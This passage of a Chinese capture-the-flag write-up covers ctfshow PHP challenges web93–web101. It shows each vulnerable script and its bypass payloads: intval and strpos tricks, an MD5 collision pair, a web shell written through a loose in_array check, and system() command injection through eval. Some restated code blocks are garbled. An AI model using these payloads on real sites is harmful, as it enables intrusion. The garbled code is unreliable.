class="number">4476e123</span></span><br></pre></td></tr></table></figure><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>十六进制里面会有字符，但是八进制仍然可以使用。<br>payload：<code>010574</code></p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。这里检测了不让第一位为0。<br>但是这个函数是可以被绕过的，利用<code>%0a</code>、<code>.</code>、<code>+</code>、<code> </code>都可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">对于<span class="title function_ invoke__">strpos</span>()函数，我们可以利用换行进行绕过（%<span class="number">0</span>a）</span><br><span class="line">payload:?num=%<span class="number">0</span>a010574</span><br><span class="line">也可以小数点绕过</span><br><span class="line">payload：?num=<span class="number">4476.0</span></span><br><span class="line">因为<span class="title function_ invoke__">intval</span>()函数只读取整数部分</span><br><span class="line">还可以八进制绕过(%<span class="number">20</span>是空格的url编码形式)</span><br><span class="line">payload：?num=%<span class="number">20010574</span></span><br><span class="line">?num= <span class="number">010574</span> <span class="comment">// 前面加个空格</span></span><br><span class="line">?num=+<span class="number">010574</span> </span><br><span class="line">?num=+<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上题payload：<code>num=%20010574</code></p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：<code>?u=./flag.php</code>这个./可以表示当前目录</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用数组绕过：<code>a[]=1&amp;b[]=2</code></p><h2 id="方法二-强碰撞"><a href="#方法二-强碰撞" class="headerlink" title="方法二 强碰撞"></a>方法二 强碰撞</h2><p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code><br>需要用bp提交。</p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a><br><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 如果有GET传参，就变成POST传参</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 如果出传入flag的值为flag，将get传参修改为cookie传参</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 同理将get转为server</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment"># 如果http_flag的值为flag，则值为flag，否则就是本文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以理解为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地</span></span><br><span class="line">址)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以直接num传入一个值，然后将post传入<code>HTTP_FLAG=flag</code>即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927233986-f0da9a13-4af2-45df-bc4e-daea53d31a16.png" alt="image.png"></p><h1 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99 in_array"></a>web99 in_array</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以理解为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//设置为数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//向数组里面插入随机数</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//写入1.php文件 内容是&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>in_array函数的漏洞：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927691590-12a4253b-84b2-416a-b2dc-d066f82cfd04.png" alt="20210125215956454.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927847639-0305094e-2c71-4bc1-8fa8-18982aa0966f.png" alt="image.png"><br>GET传入：<code>n=1.php</code><br>POST传入：<code>content=&lt;?php system($_POST[1]);?&gt;</code><br>然后就进入1.php，post传入：<code>1=tac fl*</code></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682928476651-4a45d147-98b3-43e1-9f10-b66df6fc9322.png" alt="20210126121456572.png"><br>所以这道题只需要让v1是truev0就是true了，后面都不用管。然后v2使用命令执行即可。<br>payload：<code>?v1=1&amp;v2=system(&#39;ls&#39;)/*&amp;v3=*/;</code><br><code>?v1=1&amp;v2=system(&#39;cat ctf*&#39;)&amp;v3=;</code><br><code>?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code><br>这个也行。<br>最后要将0x2d要转化成<code>-</code><br>ctfshow{ee9557f4-b67a-4c79-8603-e5653885d260}</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>但是有几个问题，为什么只能使用/</strong>/来注释不能用//，而且不能如下赋值：**<br><code>**?v1=1&amp;v2=system(&#39;cat ctf*&#39;);/*&amp;v3=*/**</code><br><strong>但是神奇的是用写在本地之后运行这种就可以了。</strong></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用反射类<br>payload：<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>关于反射类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 